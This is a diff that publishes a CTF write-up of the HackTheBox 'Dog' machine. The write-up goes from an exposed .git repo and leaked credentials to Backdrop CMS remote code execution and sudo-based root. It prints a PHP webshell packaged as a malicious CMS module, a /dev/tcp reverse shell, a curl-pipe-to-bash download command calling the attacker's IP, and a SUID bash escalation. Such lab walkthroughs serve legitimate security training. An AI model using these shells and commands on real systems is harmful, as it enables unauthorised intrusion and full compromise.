@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Dog - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Dog.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Dog machine from HackTheBox - Easy difficulty level">
+    <meta name="description" content="Detailed writeup for Dog machine from HackTheBox - Easy difficulty level">
     <meta name="keywords" content="HackTheBox, Dog, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,126 @@
         <h1 class="writeup-title">Dog</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">Active machine</span>
+            <span class="date">July 12, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Dog" src="../images/Dog/pwned.png" /></p>
-<p>Dog is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Dog retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p>k<img alt="pwned" src="../images/Dog/pwned.png" /></p>
+<p>Dog was an easy-difficulty Linux box hosting SSH on port 22 and a Backdrop CMS web application on port 80.
+Initial reconnaissance revealed an exposed .git directory, which was downloaded using git-dumper to obtain the application's source code.
+Inspection of settings.php exposed database credentials, while further exploration revealed a valid CMS user account.</p>
+<p>Using these credentials, I authenticated to the website and identified the version as 1.27.1, which is vulnerable to an RCE exploit.
+I used a publicly available Python script to achieve code execution as the www-data user.</p>
+<p>To gain a more stable shell, I created a malicious Backdrop module containing a PHP script, packaging it as a .tar archive with a valid .info file.
+After installing the module and navigating to the shell file, it executed a command to download and run a reverse shell script via curl, granting a fully interactive shell.</p>
+<p>Database access was possible using credentials found earlier, allowing me to dump password hashes from the users table.
+While cracking was in progress, I reused the known password to gain SSH access as the user johncusack.</p>
+<p>Privilege escalation was achieved through a custom binary bee, which was allowed via sudo without a password.
+By leveraging its ev (eval) functionality and running it from the CMS root directory to satisfy bootstrap requirements, I executed arbitrary commands as root.
+I opted to copy a SUID version of /bin/bash, enabling full root access and capture of the root flag.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Dog/nmap.png" /></p>
+<p>Initial nmap scan reveals 2 ports. SSH on 22 and HTTP on 80.</p>
+<h2>GIt repo exploration</h2>
+<p>Additionally, nmap has discovered an accessible git repo on the website, which I'll be able to download with gitdumper.</p>
+<p><code>git-dumper http://10.10.11.58/.git git</code></p>
+<p><img alt="git" src="../images/Dog/git.png" /></p>
+<p>In the settings.php file, I found a potential password.</p>
+<p><img alt="password" src="../images/Dog/password.png" /></p>
+<p>And after a bit more searching, I found a user.</p>
+<p><img alt="user" src="../images/Dog/user.png" /></p>
+<p>I'll visit the website next, testing whether these credentials will work.</p>
+<h2>Exploiting Backdrop RCE CVE</h2>
+<p><img alt="dog" src="../images/Dog/dog.png" /></p>
+<p>There is a login button in the top right corner. I'll try to login as Tiffany.</p>
+<p><code>tiddany@dog.htb | BackDropJ2024DS2024</code></p>
+<p><img alt="admin" src="../images/Dog/admin.png" /></p>
+<p>In the appearance tab, I found a potential version of Backdrop running on the box.</p>
+<p><img alt="veon" src="../images/Dog/veon.png" /></p>
+<p>A quick search for Backdrop 1.27.1 CVEs brought both an exploit-db entry and a github PoC.</p>
+<p><code>https://www.exploit-db.com/exploits/52021</code></p>
+<p><code>https://github.com/rvizx/backdrop-rce</code></p>
+<p>I ran the RCE script against the website.</p>
+<p><code>python exploit.py http://10.10.11.58 tiffant@dog.htb BackDropJ2024DS2024</code></p>
+<p><img alt="wwwdata" src="../images/Dog/wwwdata.png" /></p>
+<h2>Getting a better shell on the box</h2>
+<p>I checked the /etc/passwd file for users who can have sessions on the box.</p>
+<p><img alt="bashusers" src="../images/Dog/bashusers.png" /></p>
+<p>It's also possible to get valid users by enumerating home directories.</p>
+<p><img alt="home" src="../images/Dog/home.png" /></p>
+<p>Most likely, I would be able to SSH with these users if I were to get their credentials.</p>
+<p>This shell was very unstable and kept crashing after every few commands, so I pivoted to crafting a PHP webshell instead.</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>I zipped up the webshell into a zip file and tried uploading it.</p>
+<p><img alt="fail" src="../images/Dog/fail.png" /></p>
+<p>But it seems like .zip archives are not accepted. I created a .tar archive next.</p>
+<p><code>tar -czvf shells.tar shell.php</code></p>
+<p>But another error popped up.</p>
+<p><img alt="info" src="../images/Dog/info.png" /></p>
+<p>I researched a little about the .info files and created one for my webshell.</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">name</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">Evil</span><span class="w"> </span><span class="nx">Shell</span>
+<span class="nx">description</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">A</span><span class="w"> </span><span class="nx">simple</span><span class="w"> </span><span class="nx">malicious</span><span class="w"> </span><span class="nx">module</span>
+<span class="k">type</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">module</span>
+<span class="nx">core</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="nx">x</span>
+<span class="nx">backdrop</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="nx">x</span>
+<span class="kn">package</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">Custom</span>
+<span class="nx">version</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="m m-Double">1.0</span>
+</code></pre></div>
+
+<p>I installed the module, then navigated to <code>/modules/shells/shell.php</code> and added <code>?cmd=whoami</code> to execute a whoami command.</p>
+<p><img alt="command" src="../images/Dog/command.png" /></p>
+<p>I could not get a reverse shell using a regular <code>bash -c "bash -i &gt;% /dev/tcp/IP/PORT 0&gt;&amp;1"</code> command. I tested whether I could get a callback via curl.</p>
+<p><img alt="curl" src="../images/Dog/curl.png" /></p>
+<p>At this point, I decided to switch my approach. Instead of messing around with direct bash reverse shells, I'll create a new shell.sh file, which I'll host with a python server.</p>
+<p>I will then change the webshell into a system call that runs curl to download the .sh file, and pipes it directly to bash. The shell.sh file will contain the normal bash -i revserse shell.</p>
+<div class="codehilite"><pre><span></span><code># shell.sh
+
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.16.71/9001 0&gt;&amp;1
+
+This will be hosted on my python server
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">shell</span><span class="p">.</span><span class="nx">php</span><span class="p">(</span><span class="ow">in</span><span class="w"> </span><span class="nx">shells</span><span class="p">.</span><span class="nx">tar</span><span class="w"> </span><span class="nx">archive</span><span class="p">)</span>
+
+<span class="cp">&lt;?php</span>
+<span class="nb">system</span><span class="p">(</span><span class="s2">&quot;curl http://10.10.16.71/shell.sh | bash&quot;</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>After installing the module again, I visited <code>http://10.10.11.58/modules/shells/shell.php</code>, and checked my python server.</p>
+<p><img alt="download" src="../images/Dog/download.png" /></p>
+<p>Then my listener.</p>
+<p><img alt="shell.png" src="../images/Dog/shell.png" /></p>
+<h2>Extracting hashes from the database</h2>
+<p>In this shell, I can properly use mysql. When I found Tiffany's password, it was actually a part of some database connection string for mysql.</p>
+<p><code>$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';</code></p>
+<p>From this, I know that the user <code>root</code> has their password set to <code>BackDropJ2024DS2024</code>, and that there is a database named <code>backdrop</code>.</p>
+<p><img alt="hashes" src="../images/Dog/hashes.png" /></p>
+<p>I made it easier for myself to copy the hashes by running a <code>SELECT name, pass FROM users;</code> query. I then saved them into a file on my box so that I could attempt cracking.</p>
+<p>While hashcat was running, I noticed that going through rockyou would take a very long time (+3 days). I tried the database password against the two users from the passwd file, jobert and johncusack.</p>
+<p><img alt="userflag" src="../images/Dog/userflag.png" /></p>
+<h1>Root flag</h1>
+<h2>Seeking a way to privesc</h2>
+<p><img alt="sudol" src="../images/Dog/sudol.png" /></p>
+<p>I ran bee and looked through its commands. I saw something interesting in the advanced options.</p>
+<p><img alt="way" src="../images/Dog/way.png" /></p>
+<p>I can make it execute PHP commands by using <code>ev</code>.</p>
+<p><img alt="fail1" src="../images/Dog/fail1.png" /></p>
+<p>It fails due to an insufficient <code>bootstrap level</code>. Backdrop is already there and configured, so I'll move to <code>/var/www/html</code>, which is where the site's config(and backdrop's) is.</p>
+<p><img alt="work" src="../images/Dog/work.png" /></p>
+<p>And this worked. I can execute commands as root.</p>
+<h2>Gaining root access</h2>
+<p>There are many ways to get access as root. I could inject an SSH key into root's authorized_keys file, but a password was still required here. I can also create a SUID version of bash, or send myself a reverse shell.</p>
+<p>I'll go with the SUID bash way. The commands to execute are <code>cp /bin/bash /tmp/rootbash &amp;&amp; chmod 4755 /tmp/rootbash</code>.</p>
+<p><img alt="root" src="../images/Dog/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
